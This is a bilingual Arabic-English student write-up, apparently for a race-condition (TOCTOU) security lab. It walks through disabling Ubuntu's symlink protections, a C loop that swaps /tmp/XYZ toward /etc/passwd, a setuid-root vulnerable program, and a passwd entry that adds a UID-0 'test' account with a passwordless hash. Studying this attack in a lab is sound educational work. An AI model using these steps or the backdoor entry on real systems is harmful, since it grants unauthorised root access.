readme_content = """
# Lab: Race Condition Vulnerability - Documentation

هذا الملف يوثق فهمنا لهجوم Race Condition والخطوات الأولية لبدء اللاب.
This file documents our understanding of the Race Condition attack and the initial steps to start the lab.

## 1. ما هي ثغرة Race Condition؟ / What is a Race Condition?

**بالعربي:**
تحدث هذه الثغرة عندما تقوم عدة عمليات (Processes) بمحاولة الوصول إلى نفس الملف أو البيانات وتعديلها بشكل متزامن.
يعتمد نجاح الهجوم على استغلال "الفجوة الزمنية" (Race Window) بين لحظة التحقق من صلاحيات الملف (Check) ولحظة الكتابة فيه (Act). إذا استطاع المهاجم تبديل مسار الملف في هذه الفجوة الزمنية، فإنه يجبر البرنامج ذو الصلاحيات العالية (مثل الـ root) على تنفيذ أوامره على ملف حساس غير مقصود.

**In English:**
This vulnerability occurs when multiple processes attempt to access and modify the same file or data concurrently.
The attack success relies on exploiting the "Race Window" between the check of file permissions and the action of writing to the file. If an attacker can swap the file path within this tiny time window, they can trick a high-privileged program (like root) into executing operations on a sensitive file that was not intended.

---

## 2. خطوات البدء باللاب / Initial Lab Steps

**بالعربي:**
1. قمنا بالدخول إلى المجلد الخاص باللاب عبر التيرمينال: `cd Desktop/Labsetup/`.
2. تأكدنا من وجود ملفات العمل (`vulp.c` و `target_process.sh`) باستخدام أمر `ls`.
3. قمنا بإيقاف وسائل الحماية المدمجة في أوبونتو (Countermeasures) والتي تمنع تتبع الروابط الرمزية (Symlinks) في المجلدات العامة، وذلك باستخدام أوامر `sysctl`.

**In English:**
1. Navigated to the lab directory using: `cd Desktop/Labsetup/`.
2. Verified the presence of working files (`vulp.c` and `target_process.sh`) using the `ls` command.
3. Disabled built-in Ubuntu countermeasures that restrict symlink following in world-writable directories, using `sysctl` commands.

---

## 3. أوامر تعطيل الحماية / Commands to Disable Protections

لتنفيذ الهجمة، قمنا بتنفيذ الأوامر التالية في التيرمينال:
To execute the attack, we ran the following commands in the terminal:

```bash
sudo sysctl -w fs.protected_symlinks=0
sudo sysctl fs.protected_regular=0
```
![test-1](test-1.png)


readme_content = """
# Race Condition Attack Execution: Vulnerable Program & Exploit Script

هذا الملف يوثق الخطوات العملية لتنفيذ هجوم الـ Race Condition، بدءاً من تشغيل سكربت التبديل (الطرف الأول) وصولاً إلى تشغيل البرنامج المصاب (الطرف الثاني).
This file documents the practical steps to execute the Race Condition attack, starting from running the switching script (the first party) to running the vulnerable program (the second party).

---

## الخطوات التنفيذية / Execution Steps

### Step 1: Terminal Setup / فتح نافذتين ترمينال
بما أن هجوم الـ Race Condition يعتمد على سباق بين عمليتين، قم بفتح نافذتين للـ Terminal:
Since the Race Condition attack relies on a race between two processes, open two terminal windows:
- **Terminal 1:** For the attack/switching script.
- **Terminal 2:** For the vulnerable program script (`./target_process.sh`).

---

### Step 2: Create the Switching Script / إنشاء سكربت التبديل (الطرف الأول)
في النافذة الأولى، قم بإنشاء سكربت بلغة C لتبديل الرابط الرمزي بسرعة هائلة:
In the first window, create a C script to switch the symlink at high speed:

1. **Create the file:**
   ```bash
   nano attack.c
   ```
   * Paste the following code:
```bash
#include <unistd.h>

int main()
{
    while(1) {
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
        usleep(1000);

        unlink("/tmp/XYZ");
        link("/dev/null", "/tmp/XYZ");
        usleep(1000);
    }
    return 0;
}
```
* Compile the script:
```bash
gcc attack.c -o attack
```

### Step 3: Run the Race / تشغيل السباق
الآن قم بتشغيل الطرفين بالتوازي:
Now, run both parties in parallel:

#### In Terminal 1 (The Attacker):
```bash
./attack
```
#### In Terminal 2 (The Target):
```bash
sudo ./target_process.sh
```
### Step 4: Result / مراقبة النتيجة
عند نجاح الهجوم واستغلال الـ Race Window، ستتوقف النافذة الثانية تلقائياً وتظهر الرسالة التالية:
Upon successfully exploiting the Race Window, the second terminal will stop and display the following message:

```bash
"STOP... The passwd file has been changed"
```
![test-2](test-2.png)

readme_content = """
# Task 1: Choosing Our Target - Manual Verification

هذا الملف يشرح كيفية التحقق يدوياً من صلاحية المستخدم الجديد والهدف من هذه المهمة.
This file explains how to manually verify the new user's privileges and the objective of this task.

---

## 1. الهدف من المهمة / Task Objective

**بالعربي:**
الهدف هو التأكد من أن إضافة سطر مستخدم جديد بـ User ID يساوي `0` إلى ملف `/etc/passwd` يمنح صلاحيات الـ Root فورياً. نستخدم قيمة سحرية (`U6aMy0wojraho`) لتجاوز كلمة المرور.

**In English:**
The goal is to verify that adding a new user entry with a User ID of `0` to `/etc/passwd` grants immediate Root privileges. We use a "magic value" (`U6aMy0wojraho`) to bypass the password prompt.

---

## 2. خطوات التنفيذ العملي / Practical Steps

### Step 1: Add the User Entry / إضافة سطر المستخدم
قمنا بإضافة المستخدم الجديد يدوياً إلى نهاية ملف النظام المحمي:
We manually added the new user to the end of the protected system file:

1. **Open the file with root privileges:**
   ```bash
   sudo nano /etc/passwd
 ```
* Add the following line to the end of the file:
```bash
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```
### Step 2: Test the Account / اختبار الحساب
قمنا بالدخول بالحساب الجديد للتحقق من صلاحيات الـ Root:
We logged into the new account to verify Root privileges:

Switch to the new user:
```bash
su test
```
### Cleanup
بعد التأكد من نجاح الاختبار، يجب حذف السطر الذي أضفناه من ملف /etc/passwd ليعود النظام لحالته الأصلية.

In English:
After confirming the test's success, you must remove the added line from /etc/passwd to restore the system to its original state.

⚠️ ملاحظة هامة: تأكد دائماً من أخذ نسخة احتياطية للملف قبل التعديل عليه.
⚠️ Important Note: Always back up the file before making any changes.

![test-3](test-3.png)


# Task 2.A: Simulating A Slow Machine & Exploiting Race Condition
# المهمة 2.أ: محاكاة جهاز بطيء واستغلال ثغرة سباق الشروط

This file documents the complete practical steps for executing Task 2.A (simulating a slow machine via sleep(10) and manually exploiting the vulnerability).
هذا الملف يوثق الخطوات العملية الكاملة لتنفيذ المهمة الثانية (محاكاة جهاز بطيء عبر sleep(10) واستغلال الثغرة يدوياً).

---

## 1. Execution Steps / الخطوات التنفيذية

### Step 1: Modify and Compile the Vulnerable Program
### الخطوة الأولى: تعديل وبناء البرنامج المصاب

[AR] نقوم بتعديل كود البرنامج المصاب لجعله ينتظر 10 ثوانٍ بين فحص الصلاحيات وعملية الكتابة، ثم إعادة بنائه ومنحه صلاحيات الـ Root وإنشاء الملف المؤقت:
[EN] Modify the vulnerable program code to wait 10 seconds between checking permissions and writing, then recompile it, grant root privileges, and create the temporary file:

```bash
nano vulp.c
* (Add sleep(10); between access and fopen inside the code, then save and exit)
if (!access(fn, W_OK)) {
    sleep(10);  // <-- أضيفي هذا السطر هنا
    fp = fopen(fn, "a+");
    // ... باقي الكود
}

gcc vulp.c -o vulp
sudo chown root vulp
sudo chmod 4755 vulp
touch /tmp/XYZ
```
### Step 2: Run the Vulnerable Program (Terminal 1)
الخطوة الثانية: تشغيل البرنامج المصاب (النافذة الأولى)
[AR] في النافذة الأولى، نشغل البرنامج المصاب بصلاحيات الـ sudo ليبدأ العد التنازلي للـ 10 ثوانٍ:
[EN] In the first window, run the vulnerable program with sudo privileges to start the 10-second wait period:
```bash
sudo ./vulp
```
### Step 3: Change the Target File via Symbolic Link (Terminal 2)
الخطوة الثالثة: تغيير ملف الهدف عبر الرابط الرمزي (النافذة الثانية)
[AR] خلال فترة الـ 10 ثوانٍ (فترة الانتظار)، نفتح نافذة تيرمينال ثانية ونوجه الملف المؤقت إلى ملف /etc/passwd باستخدام الـ Symbolic Link:
[EN] During the 10-second sleep window, open a second terminal window and redirect the temporary file to /etc/passwd using a symbolic link:
```bash
ln -sf /etc/passwd /tmp/XYZ
```
### Step 4: Provide User Input & Test (Terminal 1)
الخطوة الرابعة: إدخال بيانات المستخدم والاختبار (النافذة الأولى)
[AR] نعود للنافذة الأولى، ندخل بيانات المستخدم الجديد (الذي يمنح صلاحيات الـ Root مع كلمة المرور السحرية)، ثم نختبر الدخول:
[EN] Return to the first terminal, input the new user data (which grants root privileges with the magic password), then test logging in:
```bash
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
* (Press Enter after inputting the text inside the program)
su test
* (Press Enter when prompted for the password to confirm successful transition to root privileges)
```



 
